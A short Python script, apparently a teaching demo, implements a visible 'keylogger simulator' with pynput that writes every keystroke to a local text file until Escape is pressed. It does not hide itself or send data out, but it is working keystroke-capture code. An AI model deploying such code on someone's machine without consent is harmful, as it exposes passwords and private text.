from pynput.keyboard import Key, Listener

# File where the keystrokes will be safely logged
log_file = "key_activity_log.txt"

print("Keylogger simulator is active... Type anything on your keyboard.")
print("Press the 'Escape' key to stop logging.")

def on_press(key):
    # Open the log file and append the pressed key
    with open(log_file, "a") as f:
        # Format the output to be clean and readable
        clean_key = str(key).replace("'", "")
        
        if clean_key == "Key.space":
            f.write(" [SPACE] ")
        elif clean_key == "Key.enter":
            f.write("\n[ENTER]\n")
        elif "Key." in clean_key:
            f.write(f" [{clean_key.upper()}] ")
        else:
            f.write(clean_key)

def on_release(key):
    # Stop the program immediately if user hits the Escape key
    if key == Key.esc:
        print("\nSimulator stopped. Checking log file...")
        return False

# Start listening to keyboard inputs
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
